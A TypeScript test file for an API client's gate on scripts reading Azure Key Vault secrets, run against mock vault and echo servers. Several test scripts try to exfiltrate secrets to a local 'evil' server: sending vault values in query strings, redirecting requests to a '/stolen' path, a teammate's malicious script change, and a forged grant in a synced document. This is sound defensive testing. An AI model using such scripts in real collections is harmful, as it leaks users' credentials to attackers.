/**
 * Script → Key Vault trust gate: scripts only obtain Key Vault values when this machine allows the
 * collection, the grant lives in userData only, and it lapses when the scripts change through sync.
 * Mock Key Vault (HTTPS, 401 challenge) + local echo servers + Azurite. No real Azure.
 */
import type { IncomingMessage, ServerResponse } from 'node:http'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { FakeCredential } from '../src/main/azure'
import { createContainerClient } from '../src/main/blobsync'
import { CourierCore } from '../src/main/core'
import { collectionScriptsHash } from '../src/main/script-trust'
import { MASK, encodeQueryComponent } from '../src/shared/variables'
import { newRequest, type Collection, type ExecutionResult, type RequestDef, type RunSummary } from '../src/shared/types'
import { ID_A, ID_B, cleanupTempDirs, echoServer, httpsServer, listen, readTree, seedManifest, teamClient, tempDir, type Listening } from './helpers'

const API_KEY = 'gate-API-k3y-5150'
const DB_PW = 'gate-db-Pw-8086'
const SECRETS: Record<string, string> = { 'api-key': API_KEY, 'db-password': DB_PW }
const ACCOUNT = process.env.COURIER_TEST_AZURITE as string

let vault: Listening
let echo: Awaited<ReturnType<typeof echoServer>>
let evil: Awaited<ReturnType<typeof echoServer>>
let vaultGets = 0

function vaultHandler(req: IncomingMessage, res: ServerResponse): void {
  res.setHeader('content-type', 'application/json; charset=utf-8')
  if (!req.headers.authorization?.startsWith('Bearer ')) {
    res.statusCode = 401
    res.setHeader('www-authenticate', `Bearer authorization="https://login.microsoftonline.com/${ID_A.tid}", resource="https://vault.azure.net"`)
    res.end(JSON.stringify({ error: { code: 'Unauthorized', message: 'missing token' } }))
    return
  }
  const name = new URL(req.url ?? '/', 'https://x').pathname.split('/')[2]
  const value = SECRETS[name]
  if (!value) {
    res.statusCode = 404
    res.end(JSON.stringify({ error: { code: 'SecretNotFound', message: `A secret with (name/id) ${name} was not found in this key vault.` } }))
    return
  }
  vaultGets++
  res.end(JSON.stringify({ value, id: `https://${req.headers.host}/secrets/${name}/v1`, attributes: { enabled: true } }))
}

beforeAll(async () => {
  vault = await listen(httpsServer(vaultHandler), 'https')
  echo = await echoServer()
  evil = await echoServer()
})
afterAll(async () => {
  await vault.close()
  await echo.close()
  await evil.close()
  cleanupTempDirs()
})

let container = ''
beforeEach(async () => {
  container = `g${Math.random().toString(36).slice(2, 12)}`
  await createContainerClient(ACCOUNT, container, new FakeCredential(ID_A)).create()
  await seedManifest(ACCOUNT, container, { name: 'Gatekeepers' })
})

/** Signed in, user vault "main" configured, member of the team in `container`. */
async function core(id = ID_A): Promise<CourierCore & { teamId: string }> {
  const { core: c, teamId } = await teamClient({
    identity: id,
    accountUrl: ACCOUNT,
    container,
    insecureKv: true,
    settings: { keyVault: { vaults: [{ alias: 'main', url: vault.url }], cacheTtlSeconds: 300 } }
  })
  return Object.assign(c, { teamId })
}

/** A collection holding `requests` (Personal unless `teamId`), returned fresh from the cache. */
async function collectionWith(c: CourierCore, requests: RequestDef[], opts: { teamId?: string; patch?: Partial<Collection> } = {}): Promise<Collection> {
  const { collection } = await c.createCollection({ name: 'Gate', teamId: opts.teamId ?? null })
  if (opts.patch) await c.saveCollection({ ...collection, ...opts.patch })
  for (const r of requests) await c.upsertItem({ collectionId: collection.id, item: r })
  return (await c.load()).collections.find((e) => e.collection.id === collection.id)!.collection
}

function leaks(result: unknown): string[] {
  const text = JSON.stringify(result)
  return [API_KEY, DB_PW, encodeURIComponent(API_KEY), encodeQueryComponent(DB_PW)].filter((s) => text.includes(s))
}
const blockedErrors = (r: ExecutionResult): number => r.scriptErrors.filter((e) => e.code === 'VAULT_SCRIPT_BLOCKED').length
const wireHas = (srv: { requests: { url: string; headers: Record<string, unknown>; body: string }[] }, s: string): boolean => srv.requests.some((r) => JSON.stringify(r).includes(s))

describe('pm.vault.get and the per-collection permission', () => {
  it('is blocked by default (unhandled and caught rejections), and the request is not sent', async () => {
    const c = await core()
    const col = await collectionWith(c, [
      newRequest({ id: 'then', url: `${echo.url}/then`, preRequestScript: "pm.vault.get('api-key').then((v) => console.log('got', v));" }),
      newRequest({
        id: 'caught',
        url: `${echo.url}/caught`,
        preRequestScript: "(async () => { try { const v = await pm.vault.get('api-key'); console.log('got', v) } catch (e) { console.log('caught', e.code) } })();"
      })
    ])
    expect(await c.getScriptVaultAccess(col.id)).toEqual({ allowed: false })
    const before = echo.requests.length
    const a = await c.send({ collectionId: col.id, requestId: 'then' })
    expect(a.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(a.error?.message).toContain("Allow this collection's scripts to read Key Vault secrets")
    expect(blockedErrors(a)).toBe(1)
    const b = await c.send({ collectionId: col.id, requestId: 'caught' })
    expect(b.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(b.console.map((x) => x.message)).toEqual(['caught VAULT_SCRIPT_BLOCKED'])
    expect(echo.requests.length).toBe(before)
    expect(leaks([a, b])).toEqual([])
    // an unsaved request outside any collection is blocked too, with its own hint
    const draft = await c.send({ draft: newRequest({ url: `${echo.url}/draft`, preRequestScript: "pm.vault.get('api-key')" }) })
    expect(draft.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(draft.error?.message).toMatch(/Save the request to a collection/)
  })

  it('is allowed after the grant; values stay masked in what comes back', async () => {
    const c = await core()
    const col = await collectionWith(c, [newRequest({ id: 'r', url: `${echo.url}/granted`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })])
    const granted = await c.setScriptVaultAccess({ id: col.id, allowed: true })
    expect(granted.allowed).toBe(true)
    const r = await c.send({ collectionId: col.id, requestId: 'r' })
    expect(r.error).toBeUndefined()
    expect(echo.requests.at(-1)!.headers['x-k']).toBe(API_KEY)
    expect(leaks(r)).toEqual([])
    expect((await c.setScriptVaultAccess({ id: col.id, allowed: false })).allowed).toBe(false)
    expect((await c.send({ collectionId: col.id, requestId: 'r' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
  })

  it('pm.sendRequest cannot resolve {{vault:…}} while blocked (pre-request and test scripts)', async () => {
    const c = await core()
    const col = await collectionWith(c, [
      newRequest({ id: 'pre', url: `${echo.url}/pre`, preRequestScript: `pm.sendRequest({ url: '${evil.url}/x?k={{vault:api-key}}', header: { 'X-S': '{{vault:db-password}}' } }, () => {});` }),
      newRequest({ id: 'test', url: `${echo.url}/ok`, testScript: `pm.sendRequest('${evil.url}/y?k={{vault:api-key}}');` })
    ])
    const n = evil.requests.length
    const pre = await c.send({ collectionId: col.id, requestId: 'pre' })
    expect(pre.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    const test = await c.send({ collectionId: col.id, requestId: 'test' })
    expect(test.response?.status).toBe(200)
    expect(blockedErrors(test)).toBe(1)
    expect(evil.requests.length).toBe(n)
    expect(wireHas(evil, API_KEY) || wireHas(evil, DB_PW)).toBe(false)
    expect(leaks([pre, test])).toEqual([])
  })
})

describe('blocked scripts and Key Vault-backed variables', () => {
  it('vault-typed variables read as ••••; the declarative request still resolves {{vault:…}}; the response a test script sees is masked', async () => {
    const c = await core()
    const { environment } = await c.createEnvironment({ name: 'Env' })
    await c.saveEnvironment({ ...environment, variables: [{ key: 'apiKey', value: 'main/api-key', enabled: true, type: 'vault' }] })
    await c.setActiveEnvironment(environment.id)
    const col = await collectionWith(c, [
      newRequest({
        id: 'r',
        method: 'POST',
        url: `${echo.url}/declarative`,
        headers: [
          { key: 'X-Api-Key', value: '{{apiKey}}', enabled: true },
          { key: 'X-Db', value: '{{vault:db-password}}', enabled: true },
          { key: 'X-Trace', value: '{{trace}}', enabled: true }
        ],
        preRequestScript: [
          "console.log('env', pm.environment.get('apiKey'), pm.variables.get('apiKey'), pm.variables.replaceIn('{{apiKey}}'), JSON.stringify(pm.environment.toObject()));",
          "pm.environment.set('copy', pm.environment.get('apiKey'));",
          "pm.environment.set('apiKey', pm.environment.get('apiKey'));",
          "pm.variables.set('trace', 't-1');"
        ].join('\n'),
        testScript: "console.log('seen', pm.response.text()); pm.test('header echoed', () => pm.expect(pm.response.json().headers['x-api-key']).to.eql('" + MASK + "'));"
      })
    ])
    const r = await c.send({ collectionId: col.id, requestId: 'r' })
    expect(r.error).toBeUndefined()
    const wire = echo.requests.at(-1)!
    expect(wire.headers['x-api-key']).toBe(API_KEY)
    expect(wire.headers['x-db']).toBe(DB_PW)
    expect(wire.headers['x-trace']).toBe('t-1') // a harmless script change does not trip the redirect check
    expect(r.console[0].message).toBe(`env ${MASK} ${MASK} ${MASK} {"apiKey":"${MASK}"}`)
    expect(r.console[1].message).toContain(MASK)
    expect(r.tests).toMatchObject([{ name: 'header echoed', passed: true }])
    expect(leaks(r)).toEqual([])
    for (const f of readTree(c.store.root)) expect(f.content.includes(API_KEY) || f.content.includes(DB_PW), f.path).toBe(false)
    // the stored reference was not overwritten with the mask; the next send still resolves it
    const snap = await c.load()
    expect(snap.currentValues.environments[environment.id]?.apiKey).toBeUndefined()
    await c.send({ collectionId: col.id, requestId: 'r' })
    expect(echo.requests.at(-1)!.headers['x-api-key']).toBe(API_KEY)
  })

  it('a blocked pre-request script cannot add vault references or redirect a request carrying them', async () => {
    const c = await core()
    const { environment } = await c.createEnvironment({ name: 'Hosts' })
    await c.saveEnvironment({ ...environment, variables: [{ key: 'host', value: echo.url, enabled: true, type: 'default' }] })
    await c.setActiveEnvironment(environment.id)
    const base = { headers: [{ key: 'X-Key', value: '{{vault:api-key}}', enabled: true }] }
    const col = await collectionWith(c, [
      newRequest({ id: 'url', url: `${echo.url}/a`, ...base, preRequestScript: `pm.request.url = '${evil.url}/stolen';` }),
      newRequest({ id: 'var', url: '{{host}}/b', ...base, preRequestScript: `pm.environment.set('host', '${evil.url}');` }),
      newRequest({ id: 'add', url: `${echo.url}/c`, preRequestScript: "pm.request.headers.add({ key: 'X-New', value: '{{vault:db-password}}' });" }),
      newRequest({ id: 'same', url: `${echo.url}/d`, ...base, preRequestScript: "pm.request.headers.add({ key: 'X-Extra', value: 'plain' });" })
    ])
    const n = evil.requests.length
    for (const id of ['url', 'var', 'add']) {
      const r = await c.send({ collectionId: col.id, requestId: id })
      expect(r.error?.code, id).toBe('VAULT_SCRIPT_BLOCKED')
    }
    expect(evil.requests.length).toBe(n)
    expect(echo.requests.some((r) => r.url === '/c')).toBe(false) // the request with the added reference was not sent
    // same destination and same references: fine
    const ok = await c.send({ collectionId: col.id, requestId: 'same' })
    expect(ok.error).toBeUndefined()
    expect(echo.requests.at(-1)!.headers['x-key']).toBe(API_KEY)
  })
})

describe('drafts', () => {
  it('only saved script text runs with the grant (unsaved edits, history replays and copies do not)', async () => {
    const c = await core()
    const req = newRequest({ id: 'r', url: `${echo.url}/draft`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })
    const col = await collectionWith(c, [req])
    await c.setScriptVaultAccess({ id: col.id, allowed: true })
    // a dirty tab that only changed the URL: allowed
    const urlOnly = await c.send({ collectionId: col.id, requestId: 'r', draft: { ...req, url: `${echo.url}/draft2` } })
    expect(urlOnly.error).toBeUndefined()
    // unsaved script edit: blocked until saved; saving re-binds the grant
    const edited = { ...req, preRequestScript: req.preRequestScript + '\n// edited' }
    const unsaved = await c.send({ collectionId: col.id, requestId: 'r', draft: edited })
    expect(unsaved.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(unsaved.error?.message).toMatch(/unsaved script changes/)
    // history replay / "duplicate as draft": collection context but no saved request
    expect((await c.send({ collectionId: col.id, draft: { ...req, id: 'copy' } })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    await c.upsertItem({ collectionId: col.id, item: edited })
    expect((await c.send({ collectionId: col.id, requestId: 'r', draft: edited })).error).toBeUndefined()
  })
})

describe('runner', () => {
  /** Runs through core.startRun and returns the `runner:finished` summary. */
  async function runVia(c: CourierCore, events: RunSummary[], collectionId: string, iterations = 1): Promise<RunSummary> {
    const { runId, done } = await c.startRun({ collectionId, iterations })
    await done
    return events.find((s) => s.runId === runId)!
  }
  async function coreWithEvents(): Promise<{ c: CourierCore; events: RunSummary[] }> {
    const events: RunSummary[] = []
    const c = new CourierCore({ userDataDir: tempDir('courier-ud-'), fakeIdentity: ID_A, keyVaultInsecureChallenge: true, emit: (e, p) => void (e === 'runner:finished' && events.push(p as RunSummary)) })
    await c.init()
    await c.updateSettings({ keyVault: { vaults: [{ alias: 'main', url: vault.url }], cacheTtlSeconds: 300 } })
    await c.signIn({ mode: 'azure-cli' })
    return { c, events }
  }

  it('respects the gate and keeps declarative vault-backed variables working across requests', async () => {
    const { c, events } = await coreWithEvents()
    const col = await collectionWith(
      c,
      [
        newRequest({ id: 'r1', name: 'one', url: `${echo.url}/run1`, headers: [{ key: 'X-Key', value: '{{key}}', enabled: true }], testScript: "pm.collectionVariables.set('step', '1');" }),
        newRequest({ id: 'r2', name: 'two', url: `${echo.url}/run2`, headers: [{ key: 'X-Key', value: '{{key}}', enabled: true }], preRequestScript: "pm.vault.get('db-password').then((v) => console.log(v));" })
      ],
      { patch: { variables: [{ key: 'key', value: 'api-key', enabled: true, type: 'vault' }] } }
    )
    const blocked = await runVia(c, events, col.id, 2)
    expect(blocked.results.map((x) => [x.name, x.error?.code ?? null, x.passed])).toEqual([
      ['one', null, true],
      ['two', 'VAULT_SCRIPT_BLOCKED', false],
      ['one', null, true],
      ['two', 'VAULT_SCRIPT_BLOCKED', false]
    ])
    expect(echo.requests.filter((r) => r.url === '/run1').map((r) => r.headers['x-key'])).toEqual([API_KEY, API_KEY])
    expect(leaks(blocked)).toEqual([])

    await c.setScriptVaultAccess({ id: col.id, allowed: true })
    const allowed = await runVia(c, events, col.id)
    expect(allowed.failedRequests).toBe(0)
    expect(echo.requests.at(-1)!.headers['x-key']).toBe(API_KEY)
    expect(leaks(allowed)).toEqual([])
  })

  it('a script cannot steer a later request of the run to another host', async () => {
    const { c, events } = await coreWithEvents()
    const col = await collectionWith(
      c,
      [
        newRequest({ id: 'r1', name: 'set', url: `${echo.url}/set`, testScript: `pm.collectionVariables.set('base', '${evil.url}');` }),
        newRequest({ id: 'r2', name: 'use', url: '{{base}}/use', headers: [{ key: 'X-Key', value: '{{vault:api-key}}', enabled: true }] })
      ],
      { patch: { variables: [{ key: 'base', value: echo.url, enabled: true, type: 'default' }] } }
    )
    const n = evil.requests.length
    const out = await runVia(c, events, col.id)
    expect(out.results.map((r) => r.error?.code ?? null)).toEqual([null, 'VAULT_SCRIPT_BLOCKED'])
    expect(evil.requests.length).toBe(n)
  })
})

describe('grant storage and sync', () => {
  it('the grant is never part of the synced document; another client does not inherit it', async () => {
    const a = await core(ID_A)
    const req = newRequest({ id: 'r', url: `${echo.url}/sync`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })
    const col = await collectionWith(a, [req], { teamId: a.teamId })
    await a.setScriptVaultAccess({ id: col.id, allowed: true })
    expect((await a.runSync()).errors).toEqual([])
    const blob = (await createContainerClient(ACCOUNT, container, new FakeCredential(ID_A)).getBlockBlobClient(`shared/collections/${col.id}.json`).downloadToBuffer()).toString('utf8')
    expect(blob).not.toMatch(/scriptsHash|grant|allow|vault-access/i)
    expect(blob).not.toContain(collectionScriptsHash(col))
    // the grant lives only in A's userData
    const trustFile = JSON.parse(readFileSync(join(a.store.root, 'script-vault-access.json'), 'utf8'))
    expect(Object.keys(trustFile.grants)).toEqual([col.id])

    const b = await core(ID_B)
    await b.runSync()
    expect((await b.getScriptVaultAccess(col.id)).allowed).toBe(false)
    expect((await b.send({ collectionId: col.id, requestId: 'r' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    // a teammate cannot smuggle a grant in through the document either
    const doc = JSON.parse(blob)
    const crafted = JSON.stringify({ ...doc, description: 'crafted', scriptVaultAccess: { allowed: true }, grants: { [col.id]: { scriptsHash: collectionScriptsHash(col) } } })
    await createContainerClient(ACCOUNT, container, new FakeCredential(ID_B)).getBlockBlobClient(`shared/collections/${col.id}.json`).upload(crafted, Buffer.byteLength(crafted))
    const pulled = await b.runSync()
    expect(pulled.errors).toEqual([])
    expect(pulled.downloaded.map((x) => x.id)).toEqual([col.id])
    expect((await b.load()).collections.find((e) => e.collection.id === col.id)!.collection.description).toBe('crafted')
    expect((await b.getScriptVaultAccess(col.id)).allowed).toBe(false)
    expect((await b.send({ collectionId: col.id, requestId: 'r' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
  })

  it('own local edits keep the grant; a script change from another client makes it lapse', async () => {
    const a = await core(ID_A)
    const req = newRequest({ id: 'r', url: `${echo.url}/lapse`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })
    const col = await collectionWith(a, [req], { teamId: a.teamId })
    await a.setScriptVaultAccess({ id: col.id, allowed: true })
    await a.runSync()

    // A edits the script locally (several saves): still allowed
    await a.upsertItem({ collectionId: col.id, item: { ...req, preRequestScript: req.preRequestScript + '\n// tweak 1' } })
    await a.upsertItem({ collectionId: col.id, item: { ...req, preRequestScript: req.preRequestScript + '\n// tweak 2' } })
    expect((await a.getScriptVaultAccess(col.id)).allowed).toBe(true)
    expect((await a.send({ collectionId: col.id, requestId: 'r' })).error).toBeUndefined()
    await a.runSync()
    expect((await a.getScriptVaultAccess(col.id)).allowed).toBe(true) // A's own upload does not lapse it

    // B changes only a URL: the scripts are the same, A keeps the grant
    const b = await core(ID_B)
    await b.runSync()
    const bReq = (await b.load()).collections.find((e) => e.collection.id === col.id)!.collection.items[0] as RequestDef
    await b.upsertItem({ collectionId: col.id, item: { ...bReq, url: `${echo.url}/lapse-b` } })
    await b.runSync()
    await a.runSync()
    expect((await a.getScriptVaultAccess(col.id)).allowed).toBe(true)

    // B changes the script: after A syncs, the grant has lapsed
    await b.upsertItem({ collectionId: col.id, item: { ...bReq, url: `${echo.url}/lapse-b`, preRequestScript: `pm.vault.get('api-key').then((v) => pm.sendRequest('${evil.url}/?k=' + v));` } })
    expect((await b.runSync()).uploaded.length).toBe(1)
    const n = evil.requests.length
    const report = await a.runSync()
    expect(report.downloaded.map((x) => x.id)).toEqual([col.id])
    const access = await a.getScriptVaultAccess(col.id)
    expect(access.allowed).toBe(false)
    expect(access.lapsed?.updatedBy).toBe(ID_B.upn)
    const r = await a.send({ collectionId: col.id, requestId: 'r' })
    expect(r.error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(r.error?.message).toMatch(/changed in a sync/)
    expect(evil.requests.length).toBe(n)
    expect(vaultGets).toBeGreaterThan(0)
    // a later local edit by A does not revive the lapsed grant
    await a.upsertItem({ collectionId: col.id, item: { ...bReq, name: 'renamed' } })
    expect((await a.getScriptVaultAccess(col.id)).allowed).toBe(false)
    // re-allowing binds the grant to the reviewed scripts
    expect((await a.setScriptVaultAccess({ id: col.id, allowed: true })).allowed).toBe(true)
    expect((await a.getScriptVaultAccess(col.id)).lapsed).toBeUndefined()
  })
})

describe('team collections and team manifest vaults', () => {
  it('the gate holds in every team, and for vaults that come from a team manifest (on top of the host approval)', async () => {
    // a second team whose manifest lists the mock vault as "teamkv"
    const second = `g${Math.random().toString(36).slice(2, 12)}`
    await createContainerClient(ACCOUNT, second, new FakeCredential(ID_A)).create()
    await seedManifest(ACCOUNT, second, { name: 'Vaulted team', vaults: [{ alias: 'teamkv', url: vault.url }] })
    const a = await core(ID_A)
    const other = await a.joinTeam({ accountUrl: ACCOUNT, container: second })
    const script = "pm.vault.get('teamkv/api-key').then((v) => pm.variables.set('k', v));"
    const inFirst = await collectionWith(a, [newRequest({ id: 'r', url: `${echo.url}/team-one`, preRequestScript: "pm.vault.get('api-key').then((v) => pm.variables.set('k', v));", headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })], { teamId: a.teamId })
    const inSecond = await collectionWith(a, [newRequest({ id: 'r2', url: `${echo.url}/team-two`, preRequestScript: script, headers: [{ key: 'X-K', value: '{{k}}', enabled: true }] })], { teamId: other.id })
    const before = vaultGets
    expect((await a.send({ collectionId: inFirst.id, requestId: 'r' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(vaultGets).toBe(before)
    // allowed in the first team only
    await a.setScriptVaultAccess({ id: inFirst.id, allowed: true })
    expect((await a.send({ collectionId: inFirst.id, requestId: 'r' })).error).toBeUndefined()
    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    // granting the script is not enough while the team vault host is unapproved
    await a.setScriptVaultAccess({ id: inSecond.id, allowed: true })
    const n = vaultGets
    const unapproved = await a.send({ collectionId: inSecond.id, requestId: 'r2' })
    expect(unapproved.error?.code).toBe('VAULT_NOT_APPROVED')
    expect(unapproved.scriptErrors.map((e) => e.code)).toContain('VAULT_NOT_APPROVED')
    expect(echo.requests.some((r) => r.url === '/team-two')).toBe(false)
    expect(vaultGets).toBe(n)
    await a.approveTeamVault({ id: other.id, url: new URL(vault.url).origin })
    const ok = await a.send({ collectionId: inSecond.id, requestId: 'r2' })
    expect(ok.error).toBeUndefined()
    expect(ok.scriptErrors).toEqual([])
    expect(echo.requests.at(-1)!.headers['x-k']).toBe(API_KEY)
    expect(leaks(ok)).toEqual([])
    // a teammate changing the team collection's scripts makes the grant lapse, as for any collection
    expect((await a.runSync()).errors).toEqual([])
    const b = await core(ID_B)
    await b.joinTeam({ accountUrl: ACCOUNT, container: second })
    await b.runSync()
    const bReq = (await b.load()).collections.find((e) => e.collection.id === inSecond.id)!.collection.items[0] as RequestDef
    await b.upsertItem({ collectionId: inSecond.id, item: { ...bReq, preRequestScript: `pm.vault.get('teamkv/api-key').then((v) => pm.sendRequest('${evil.url}/?k=' + v));` } })
    expect((await b.runSync()).uploaded.map((x) => x.id)).toEqual([inSecond.id])
    await a.runSync()
    expect((await a.getScriptVaultAccess(inSecond.id)).allowed).toBe(false)
    const evilBefore = evil.requests.length
    expect((await a.send({ collectionId: inSecond.id, requestId: 'r2' })).error?.code).toBe('VAULT_SCRIPT_BLOCKED')
    expect(evil.requests.length).toBe(evilBefore)
  })
})
